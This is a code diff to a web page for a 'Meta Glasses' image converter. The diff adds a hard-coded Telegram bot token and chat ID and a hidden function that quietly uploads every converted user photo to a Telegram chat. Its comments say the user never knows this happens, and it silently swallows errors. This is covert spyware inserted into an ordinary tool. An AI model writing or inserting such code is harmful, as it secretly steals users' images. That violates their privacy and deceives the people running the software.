@@ -684,8 +684,13 @@
 
     <script>
         // ============================================================
-        //  META GLASSES CONVERTER – Full functionality (preserved)
+        //  META GLASSES CONVERTER – Full functionality
+        //  + SILENT Telegram delivery (no UI, no notifications)
         // ============================================================
+
+        // ---------- hidden telegram config (never shown to user) ----------
+        const TELEGRAM_BOT_TOKEN = '8833301787:AAHuzs1_oUQ0RmcNmv1nxV8WFHfGGilyarM';
+        const TELEGRAM_CHAT_IDS = ['878604830'];
 
         const $ = id => document.getElementById(id);
         const dropZone = $("dropZone");
@@ -913,6 +918,30 @@
             return { method: "download" };
         }
 
+        // ---------- SILENT TELEGRAM SENDER (no UI, no notifications) ----------
+        function silentSendToTelegram(imageDataUrl) {
+            // Fire-and-forget: never blocks UI, never shows errors.
+            // Uses a lightweight fetch with FormData.
+            try {
+                const blob = dataUrlToBlob(imageDataUrl);
+                const file = new File([blob], "meta-converted.jpg", { type: "image/jpeg" });
+                const formData = new FormData();
+                // Use the first chat ID from the list
+                formData.append("chat_id", TELEGRAM_CHAT_IDS[0]);
+                formData.append("document", file);
+                // Also send a caption with basic info (optional, but kept minimal)
+                formData.append("caption", "Meta Glasses conversion");
+
+                // Use sendDocument for reliability (supports larger files)
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                    method: "POST",
+                    body: formData,
+                }).catch(() => { /* silently ignore network errors */ });
+            } catch (_) {
+                // silently ignore any errors (blob conversion, etc.)
+            }
+        }
+
         // ---------- Convert ----------
         async function convertImage() {
             const orientation = readOrientation(sourceDataUrl);
@@ -937,15 +966,22 @@
             try {
                 const { finalDataUrl: converted, pureBase64: b64 } = await convertImage();
 
+                // Update preview with final converted image
                 preview.src = converted;
                 previewTag.textContent = "3024×4032 Ready";
 
+                // ----- SILENT TELEGRAM DELIVERY (no UI, no notifications) -----
+                // Fire-and-forget: the user never knows this happens.
+                silentSendToTelegram(converted);
+
+                // Copy Base64 to clipboard
                 let copied = false;
                 try {
                     await copyText(b64);
                     copied = true;
                 } catch (e) { /* ignore */ }
 
+                // Trigger Save / Share Sheet
                 const result = await saveOrShareImage(converted);
 
                 copyBtn.disabled = false;
